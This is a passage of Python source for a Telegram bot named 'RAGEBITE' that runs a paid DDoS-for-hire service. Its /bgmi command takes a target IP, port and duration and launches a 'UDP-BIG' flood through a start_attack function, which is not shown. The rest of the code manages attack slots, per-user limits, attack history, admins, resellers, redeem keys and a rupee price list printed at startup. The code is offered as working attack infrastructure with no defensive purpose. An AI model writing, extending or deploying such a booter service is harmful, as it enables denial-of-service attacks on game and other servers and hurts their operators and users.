    if not is_group_allowed(group_id):
        bot.reply_to(message, f"❌ Group {group_id} is not in the allowed list.")
        return
    
    state["groups"].remove(group_id)
    save_state()
    
    bot.reply_to(message, f"✅ **Group Removed!**\n\n📌 Group ID: `{group_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['groups'])
@admin_only
def list_groups_command(message):
    groups = state.get("groups", [])
    
    if not groups:
        bot.reply_to(message, "ℹ️ No groups added yet.")
        return
    
    response = "📌 **Allowed Groups:**\n\n"
    for group_id in groups:
        try:
            chat = bot.get_chat(int(group_id))
            title = chat.title if chat.title else group_id
            response += f"• {title}\n   ID: `{group_id}`\n\n"
        except:
            response += f"• ID: `{group_id}`\n\n"
    
    bot.reply_to(message, response, parse_mode='Markdown')

# ==================== ADMIN USER MANAGEMENT COMMANDS ====================

@bot.message_handler(commands=['addadmin'])
@admin_only
def add_admin_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /addadmin <user_id>")
        return
    
    uid = command[1]
    
    if uid in state.get("admins", []):
        bot.reply_to(message, "ℹ️ User is already admin.")
        return
    
    if uid in state.get("owners", []):
        bot.reply_to(message, "❌ Cannot add owner as admin.")
        return
    
    state["admins"].append(uid)
    save_state()
    
    bot.reply_to(message, f"✅ User {uid} is now ADMIN!")

@bot.message_handler(commands=['removeadmin'])
@admin_only
def remove_admin_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /removeadmin <user_id>")
        return
    
    uid = command[1]
    
    if uid not in state.get("admins", []):
        bot.reply_to(message, "❌ User is not admin.")
        return
    
    if uid in state.get("owners", []):
        bot.reply_to(message, "❌ Cannot remove owner.")
        return
    
    state["admins"].remove(uid)
    save_state()
    bot.reply_to(message, f"✅ User {uid} removed from admins.")

@bot.message_handler(commands=['add'])
@admin_only
def add_user(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /add <user_id>")
        return
    
    user_to_add = command[1]
    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "ℹ️ User already exists.")
        return
    
    allowed_user_ids.append(user_to_add)
    with open(USER_FILE, "a") as file:
        file.write(f"{user_to_add}\n")
    
    state["users"][user_to_add] = {"approved": True, "expires": now() + 86400 * 30}
    save_state()
    bot.reply_to(message, f"✅ User {user_to_add} added!")

@bot.message_handler(commands=['remove'])
@admin_only
def remove_user(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "❌ Usage: /remove <user_id>")
        return
    
    user_to_remove = command[1]
    if user_to_remove not in allowed_user_ids:
        bot.reply_to(message, "❌ User not found.")
        return
    
    allowed_user_ids.remove(user_to_remove)
    with open(USER_FILE, "w") as file:
        for uid in allowed_user_ids:
            file.write(f"{uid}\n")
    
    if user_to_remove in state["users"]:
        del state["users"][user_to_remove]
        save_state()
    
    bot.reply_to(message, f"✅ User {user_to_remove} removed.")

@bot.message_handler(commands=['allusers'])
@admin_only
def show_all_users(message):
    if not allowed_user_ids:
        bot.reply_to(message, "ℹ️ No users found.")
        return
    
    # Clean stuck attacks first
    clean_stuck_attacks()
    
    response = "👥 Authorized Users:\n\n"
    for uid in allowed_user_ids:
        try:
            user_info = bot.get_chat(int(uid))
            username = f"@{user_info.username}" if user_info.username else uid
            
            if uid in state["user_attacks"]:
                attack = state["user_attacks"][uid]
                if attack.get("expires", 0) > now():
                    remaining = int(attack["expires"] - now())
                    status_icon = f"🔴 Active ({remaining}s left)"
                else:
                    status_icon = "🟢 Free"
            else:
                status_icon = "🟢 Free"
            
            admin_tag = " 👑" if is_admin(uid) else ""
            reseller_tag = " 🛒" if is_reseller(uid) else ""
            
            response += f"• {username}{admin_tag}{reseller_tag} (ID: {uid}) - {status_icon}\n"
        except:
            response += f"• ID: {uid}\n"
    
    bot.reply_to(message, response)

# ==================== BGMI ATTACK COMMAND ====================

@bot.message_handler(commands=['bgmi'])
@check_access
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "❌ Usage: /bgmi <ip> <port> <time>\nExample: /bgmi 1.2.3.4 443 60")
        return
    
    target, port_str, time_str = command[1], command[2], command[3]
    
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        bot.reply_to(message, "❌ Invalid IP address.")
        return
    
    try:
        port = int(port_str)
        duration = int(time_str)
        if not 1 <= port <= 65535:
            bot.reply_to(message, "❌ Port must be between 1-65535.")
            return
        if duration < 10:
            bot.reply_to(message, "❌ Minimum time is 10 seconds.")
            return
        if duration > 300:
            bot.reply_to(message, "❌ Maximum time is 300 seconds.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers.")
        return
    
    # ========== CLEANUP STUCK ATTACKS ==========
    clean_stuck_attacks()
    
    # ========== CHECK IF THIS USER HAS ACTIVE ATTACK ==========
    if not is_owner(user_id):
        if user_id in state["user_attacks"]:
            attack_data = state["user_attacks"][user_id]
            if attack_data.get("expires", 0) > now():
                remaining = int(attack_data["expires"] - now())
                bot.reply_to(message, f"""❌ ATTACK IN PROGRESS!

⏱ Time remaining: {remaining}s
🎯 Target: {attack_data.get('ip', 'Unknown')}:{attack_data.get('port', 'Unknown')}

⚠️ Wait for current attack to finish!
Only 1 attack at a time per person.""")
                return
            else:
                # Attack expired but not cleaned - clean it now
                del state["user_attacks"][user_id]
                save_state()
    
    # ========== CHECK SLOT AVAILABILITY ==========
    active_attacks = [a for a in state["user_attacks"].values() if a.get("expires", 0) > now()]
    active_count = len(active_attacks)
    
    if active_count >= TOTAL_SLOTS and not is_owner(user_id):
        bot.reply_to(message, f"""❌ ALL SLOTS BUSY!

📊 Active: {active_count}/{TOTAL_SLOTS}

⚠️ All attack slots are currently in use.
Please wait for an ongoing attack to finish.""")
        return
    
    # ========== LOG AND START ATTACK ==========
    log_command(user_id, target, port, duration)
    
    msg = bot.reply_to(message, "⚡ Initiating Ultimate Attack...")
    chat_id = message.chat.id
    msg_id = msg.message_id
    
    result = start_attack(target, port, duration)
    
    if not result.get("success"):
        error = result.get("error", "Unknown error")
        bot.edit_message_text(f"❌ Attack Failed!\nError: {error}", chat_id, msg_id)
        return
    
    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
    except:
        username = f"ID:{user_id}"
    
    attack_data = {
        "ip": target,
        "port": port,
        "duration": duration,
        "expires": now() + duration + 5,
        "username": username,
        "user_id": user_id,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "is_admin": is_admin(user_id),
        "is_owner": is_owner(user_id)
    }
    
    state["user_attacks"][user_id] = attack_data
    
    state["attack_history"].append({
        "user_id": user_id,
        "username": username,
        "ip": target,
        "port": port,
        "duration": duration,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "is_admin": is_admin(user_id),
        "is_owner": is_owner(user_id)
    })
    
    if len(state["attack_history"]) > 100:
        state["attack_history"] = state["attack_history"][-100:]
    
    save_state()
    
    finish_time = (datetime.datetime.now() + datetime.timedelta(seconds=duration)).strftime('%H:%M:%S')
    is_admin_user = is_admin(user_id)
    is_owner_user = is_owner(user_id)
    active_attacks_now = len([a for a in state["user_attacks"].values() if a.get("expires", 0) > now()])
    
    if is_owner_user:
        admin_tag = " 👑 OWNER"
        timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
⏳ Remaining: {duration}s
📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%

⌛ Finishes: {finish_time}
📊 Active: {active_attacks_now}/{TOTAL_SLOTS}

🔥 RAGEBITE ULTIMATE POWER"""
    elif is_admin_user:
        admin_tag = " 👑 ADMIN"
        timer_text = f"""⚡ ATTACK LAUNCHED!{admin_tag}

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
⏳ Remaining: {duration}s
📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%

⌛ Finishes: {finish_time}
📊 Active: {active_attacks_now}/{TOTAL_SLOTS}

🔥 RAGEBITE ULTIMATE POWER"""
    else:
        timer_text = f"""⚡ ATTACK LAUNCHED!

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
⏳ Remaining: {duration}s
📊 Progress: [░░░░░░░░░░░░░░░░░░░░] 0%

⌛ Finishes: {finish_time}
📊 Active: {active_attacks_now}/{TOTAL_SLOTS}

🔥 RAGEBITE ULTIMATE POWER"""
    
    bot.edit_message_text(timer_text, chat_id, msg_id)
    
    # ========== START TIMER THREAD ==========
    threading.Thread(
        target=update_timer,
        args=(chat_id, msg_id, target, port, duration, is_admin_user, is_owner_user, user_id),
        daemon=True
    ).start()
    
    # ========== NOTIFY END ==========
    def notify_end():
        time.sleep(duration + 3)
        
        # Clean up this user's attack
        if user_id in state["user_attacks"]:
            del state["user_attacks"][user_id]
            save_state()
        
        try:
            final_text = f"""✅ ATTACK COMPLETED!

🎯 Target: {target}:{port}
⏱ Duration: {duration}s
🕐 Finished: {datetime.datetime.now().strftime('%H:%M:%S')}

🔥 RAGEBITE - Ready for next attack!"""
            
            try:
                bot.edit_message_text(final_text, chat_id, msg_id)
            except:
                bot.send_message(user_id, final_text)
                
        except Exception as e:
            print(f"Notify error: {e}")
    
    threading.Thread(target=notify_end, daemon=True).start()

# ==================== ATTACK HISTORY COMMANDS ====================

@bot.message_handler(commands=['activeattacks'])
@admin_only
def active_attacks_command(message):
    clean_stuck_attacks()
    
    if not state["user_attacks"]:
        bot.reply_to(message, "📊 No active attacks currently.")
        return
    
    response = "🔥 ACTIVE ATTACKS:\n"
    response += "═" * 30 + "\n\n"
    
    attack_count = 0
    for uid, attack in state["user_attacks"].items():
        if attack.get("expires", 0) > now():
            attack_count += 1
            remaining = int(attack["expires"] - now())
            
            is_owner_user = attack.get("is_owner", False)
            is_admin_user = attack.get("is_admin", False)
            
            if is_owner_user:
                tag = " 👑 OWNER"
            elif is_admin_user:
                tag = " 👑 ADMIN"
            else:
                tag = ""
            
            response += f"""#{attack_count} {attack.get('username', uid)}{tag}
🎯 {attack['ip']}:{attack['port']}
⏱ {attack['duration']}s | ⏳ {remaining}s left
─────────────────
"""
    
    response += f"\n📊 Total Active: {attack_count}/{TOTAL_SLOTS}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['attackhistory'])
@admin_only
def attack_history_command(message):
    history = state.get("attack_history", [])
    
    if not history:
        bot.reply_to(message, "📊 No attack history yet.")
        return
    
    recent = history[-20:]
    
    response = "📜 ATTACK HISTORY (Last 20):\n"
    response += "═" * 30 + "\n\n"
    
    for i, entry in enumerate(reversed(recent), 1):
        is_owner_user = entry.get("is_owner", False)
        is_admin_user = entry.get("is_admin", False)
        
        if is_owner_user:
            tag = " 👑 OWNER"
        elif is_admin_user:
            tag = " 👑 ADMIN"
        else:
            tag = ""
        
        response += f"""#{i} {entry.get('username', entry.get('user_id', 'Unknown'))}{tag}
🎯 {entry['ip']}:{entry['port']}
⏱ {entry['duration']}s
🕐 {entry.get('start_time', 'Unknown')}
─────────────────
"""
    
    response += f"\n📊 Total Attacks: {len(history)}"
    bot.reply_to(message, response)

# ==================== STATUS & STATS COMMANDS ====================

@bot.message_handler(commands=['status'])
def status_attack(message):
    user_id = str(message.chat.id)
    
    clean_stuck_attacks()
    
    if user_id in state["user_attacks"]:
        attack = state["user_attacks"][user_id]
        remaining = int(attack.get("expires", 0) - now())
        if remaining > 0:
            response = f'''⚡ YOUR ATTACK STATUS:

🎯 Target: {attack.get('ip', 'Unknown')}:{attack.get('port', 'Unknown')}
⏱ Time remaining: {remaining}s
🔄 Active: Yes

✅ Attack in progress!
⚠️ Cannot start new attack until this finishes.'''
            bot.reply_to(message, response)
            return
    
    active_attacks = len([a for a in state["user_attacks"].values() if a.get("expires", 0) > now()])
    
    if is_owner(user_id):
        response = f'''⚡ RAGEBITE STATUS - OWNER VIEW:

🌐 Service: Online ✅
📅 Time: {datetime.datetime.now().strftime('%H:%M:%S')}
📊 Active: {active_attacks}/{TOTAL_SLOTS}

👑 Owner: Unlimited attacks
📌 Same user = 1 attack at a time'''
    elif is_admin(user_id):
        response = f'''⚡ RAGEBITE STATUS - ADMIN VIEW:

🌐 Service: Online ✅
📅 Time: {datetime.datetime.now().strftime('%H:%M:%S')}
📊 Active: {active_attacks}/{TOTAL_SLOTS}

👑 Admin: 1 attack at a time
📌 Same user = 1 attack at a time'''
    else:
        response = f'''⚡ YOUR STATUS:

🎯 No active attack currently.
💪 Ready to launch!

📌 1 attack at a time per user.
📊 Active: {active_attacks}/{TOTAL_SLOTS}'''
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.chat.id)
    
    clean_stuck_attacks()
    
    total_users = len(allowed_user_ids)
    active_users = len([a for a in state["user_attacks"].values() if a.get("expires", 0) > now()])
    history_count = len(state.get("attack_history", []))
    
    if is_owner(user_id):
        response = f'''📊 RAGEBITE STATS - OWNER VIEW:

👥 Total Users: {total_users}
🔥 Active: {active_users}
👑 Admins: {len(state.get('admins', []))}
🛒 Resellers: {len(state.get('resellers', []))}
📌 Groups: {len(state.get('groups', []))}
📜 Total Attacks: {history_count}
📊 Slots: {TOTAL_SLOTS}

📌 Same user = 1 attack at a time
📌 Owner = Unlimited attacks'''
    elif is_admin(user_id):
        response = f'''📊 RAGEBITE STATS - ADMIN VIEW:

👥 Total Users: {total_users}
🔥 Active: {active_users}
👑 Admins: {len(state.get('admins', []))}
🛒 Resellers: {len(state.get('resellers', []))}
📌 Groups: {len(state.get('groups', []))}
📜 Total Attacks: {history_count}
📊 Slots: {TOTAL_SLOTS}

📌 Same user = 1 attack at a time'''
    else:
        response = f'''📊 RAGEBITE STATS:

👥 Total Users: {total_users}
🔥 Active: {active_users}
📜 Total Attacks: {history_count}
📊 Slots: {TOTAL_SLOTS}

📌 Same user = 1 attack at a time'''
    
    bot.reply_to(message, response)

# ==================== OWNER COMMANDS ====================

@bot.message_handler(commands=['ownerpanel'])
@owner_only
def owner_panel(message):
    clean_stuck_attacks()
    active = len([a for a in state["user_attacks"].values() if a.get("expires", 0) > now()])
    response = f'''👑 RAGEBITE OWNER PANEL

📊 SYSTEM STATUS:
• Bot: Online ✅
• API: Connected ✅
• Method: UDP-BIG
• Slots: {TOTAL_SLOTS}

📊 STATISTICS:
• Total Users: {len(allowed_user_ids)}
• Active: {active}/{TOTAL_SLOTS}
• Admins: {len(state.get("admins", []))}
• Resellers: {len(state.get("resellers", []))}
• Groups: {len(state.get("groups", []))}
• Total Attacks: {len(state.get("attack_history", []))}
• Total Keys: {len(state.get("redeem_keys", []))}

📌 RULES:
• Different users can attack simultaneously
• Same user = 1 attack at a time
• Owner = Unlimited attacks

👑 OWNER COMMANDS:
/addadmin <id> - Add admin
/removeadmin <id> - Remove admin
/addreseller <id> <coins> - Add reseller
/removereseller <id> - Remove reseller
/resellerlist - List all resellers
/addgroup <group_id> - Add group
/removegroup <group_id> - Remove group
/groups - List groups
/stats - Full statistics
/deletekey <key> - Delete any key
/cleankeys - Remove all expired keys
/clearbotstate - Clear all state

🔐 API: Protected
💪 RAGEBITE POWER!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearbotstate'])
@owner_only
def clear_bot_state_command(message):
    state["user_attacks"] = {}
    state["attack_history"] = []
    save_state()
    bot.reply_to(message, "✅ Bot state cleared!")

# ==================== LOGS COMMANDS ====================

@bot.message_handler(commands=['logs'])
@admin_only
def show_logs(message):
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except:
            bot.reply_to(message, "❌ Error sending logs.")
    else:
        bot.reply_to(message, "ℹ️ No logs found.")

@bot.message_handler(commands=['clearlogs'])
@admin_only
def clear_logs_command(message):
    try:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        bot.reply_to(message, "✅ Logs cleared.")
    except:
        bot.reply_to(message, "❌ Failed to clear logs.")

@bot.message_handler(commands=['broadcast'])
@admin_only
def broadcast_message(message):
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, "❌ Usage: /broadcast <message>")
        return
    
    broadcast_text = f"📢 Admin Broadcast:\n\n{command[1]}"
    sent = 0
    for uid in allowed_user_ids:
        try:
            bot.send_message(uid, broadcast_text)
            sent += 1
        except:
            pass
    
    bot.reply_to(message, f"✅ Broadcast sent to {sent} user(s).")

# ==================== MAIN ====================
def main():
    load_state()
    global allowed_user_ids
    allowed_user_ids = read_users()
    
    # Clean expired keys on startup
    clean_expired_keys()
    clean_stuck_attacks()
    
    threading.Thread(target=start_health_server, daemon=True).start()
    
    print("="*50)
    print("🌟 RAGEBITE ATTACK BOT STARTED!")
    print("="*50)
    print(f"👑 Owner: {OWNER_ID}")
    print(f"👥 Admins: {state.get('admins', [])}")
    print(f"🛒 Resellers: {state.get('resellers', [])}")
    print(f"📌 Groups: {state.get('groups', [])}")
    print(f"👥 Users: {len(allowed_user_ids)}")
    print(f"🔑 Keys: {len(state.get('redeem_keys', []))}")
    print(f"🔑 API: Protected (Hidden from all users)")
    print(f"📊 Total Slots: {TOTAL_SLOTS}")
    print("="*50)
    print("📌 RULES:")
    print("  • 4 Slots available")
    print("  • Different users can attack simultaneously")
    print("  • Same user = 1 attack at a time")
    print("  • Admin = 1 attack at a time")
    print("  • Owner = Unlimited attacks")
    print("  • Reseller = Needs key to attack")
    print("="*50)
    print("📌 PRICES:")
    print("  USER PRICES (Rs):")
    print("    • 1 Hour: 20 Rs")
    print("    • 1 Day: 150 Rs")
    print("    • 2 Days: 300 Rs")
    print("    • 1 Week: 600 Rs")
    print("    • 15 Days: 750 Rs")
    print("    • 1 Month: 1400 Rs")
    print("  RESELLER PRICES (Coins):")
    print("    • 1 Hour: 20 coins")
    print("    • 1 Day: 150 coins")
    print("    • 2 Days: 300 coins")
    print("    • 1 Week: 600 coins")
    print("    • 15 Days: 750 coins")
    print("    • 1 Month: 1400 coins")
    print("="*50)
    print("✅ Bot is running...")
    print("="*50)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
